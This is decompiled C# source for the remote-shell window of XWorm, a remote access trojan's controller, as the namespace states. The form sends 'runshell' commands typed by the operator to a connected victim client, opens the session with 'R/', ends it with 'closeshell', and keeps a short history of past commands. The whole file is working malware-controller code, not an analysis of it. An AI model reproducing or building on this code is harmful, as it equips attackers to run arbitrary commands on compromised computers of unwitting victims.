using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm
{
	// Token: 0x02000030 RID: 48
	[DesignerGenerated]
	public partial class Shell : Form
	{
		// Token: 0x060008B6 RID: 2230 RVA: 0x0004B6A8 File Offset: 0x000498A8
		public Shell()
		{
			base.Load += this.TEST_Load;
			base.FormClosing += this.TEST_FormClosing;
			this.int_0 = 0;
			this.int_1 = 0;
			this.string_1 = new string[5];
			this.InitializeComponent();
		}

		// Token: 0x17000332 RID: 818
		// (get) Token: 0x060008B9 RID: 2233 RVA: 0x0004BC49 File Offset: 0x00049E49
		// (set) Token: 0x060008BA RID: 2234 RVA: 0x0004BC54 File Offset: 0x00049E54
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000333 RID: 819
		// (get) Token: 0x060008BB RID: 2235 RVA: 0x0004BC97 File Offset: 0x00049E97
		// (set) Token: 0x060008BC RID: 2236 RVA: 0x0004BCA4 File Offset: 0x00049EA4
		internal virtual Guna2TextBox Guna2TextBox1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2TextBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler value2 = new KeyEventHandler(this.Guna2TextBox1_KeyDown);
				Guna2TextBox guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.KeyDown -= value2;
				}
				this._Guna2TextBox1 = value;
				guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.KeyDown += value2;
				}
			}
		}

		// Token: 0x17000334 RID: 820
		// (get) Token: 0x060008BD RID: 2237 RVA: 0x0004BCE7 File Offset: 0x00049EE7
		// (set) Token: 0x060008BE RID: 2238 RVA: 0x0004BCF1 File Offset: 0x00049EF1
		internal virtual Guna2TextBox Guna2TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x060008BF RID: 2239 RVA: 0x0004BCFC File Offset: 0x00049EFC
		private void TEST_Load(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("R/");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060008C0 RID: 2240 RVA: 0x0004BD3C File Offset: 0x00049F3C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060008C1 RID: 2241 RVA: 0x0004BD94 File Offset: 0x00049F94
		private void TEST_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("closeshell");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060008C2 RID: 2242 RVA: 0x0004BDD4 File Offset: 0x00049FD4
		private void Guna2TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			Keys keyCode = e.KeyCode;
			checked
			{
				if (keyCode != Keys.Return)
				{
					if (keyCode != Keys.Up)
					{
						if (keyCode == Keys.Down)
						{
							this.int_0 += -1;
							bool flag = this.int_0 < 0;
							if (flag)
							{
								this.int_0 = 0;
							}
							this.Guna2TextBox1.Text = this.string_1[this.int_0];
						}
					}
					else
					{
						ref int ptr = ref this.int_0;
						this.int_0 = ptr + 1;
						bool flag2 = this.int_0 > this.string_1.Length - 1;
						if (flag2)
						{
							this.int_0 = this.string_1.Length - 1;
						}
						this.Guna2TextBox1.Text = this.string_1[this.int_0];
					}
				}
				else
				{
					e.SuppressKeyPress = true;
					string text = this.Guna2TextBox1.Text;
					bool flag3 = text.Length > 0;
					if (flag3)
					{
						this.string_1[this.int_1] = text;
						ref int ptr = ref this.int_1;
						this.int_1 = ptr + 1;
						bool flag4 = this.int_1 > this.string_1.Length - 1;
						if (flag4)
						{
							this.int_1 = 0;
						}
						byte[] state = Helper.SB("runshell" + SettingsHelper.SPL + this.Guna2TextBox1.Text);
						Client $VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
						bool flag5 = Operators.CompareString(text, "cls", false) == 0;
						if (flag5)
						{
							this.Guna2TextBox2.Clear();
						}
						this.Guna2TextBox1.Clear();
					}
				}
			}
		}

		// Token: 0x0400039F RID: 927
		public Client C;

		// Token: 0x040003A0 RID: 928
		private int int_0;

		// Token: 0x040003A1 RID: 929
		private int int_1;

		// Token: 0x040003A2 RID: 930
		private string[] string_1;
	}
}
